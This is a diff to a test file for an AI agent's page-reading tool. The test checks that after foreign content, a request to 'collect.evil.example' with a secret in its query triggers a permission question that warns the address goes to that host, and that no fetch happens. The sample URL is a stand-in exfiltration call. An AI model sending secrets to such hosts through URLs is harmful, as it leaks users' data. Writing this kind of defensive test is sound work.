@@ -66,6 +66,10 @@ describe('a read URL with a query, after foreign content', () => {
     const result = await read(agent, 'https://collect.evil.example/p?d=secret');
     expect(ask.asked).toHaveLength(1);
     expect(ask.asked[0]).toContain('"collect.evil.example"');
+    // The question says what happens: a page is read, and the address goes to the host.
+    expect(ask.asked[0]).toMatch(/^Read page: /);
+    expect(ask.asked[0]).toContain('Read it anyway? Everything in the address then goes to this host.');
+    expect(ask.asked[0]).not.toContain('Send anyway');
     expect(tool.reads).toEqual([]);
     expect(result.is_error).toBe(true);
   });
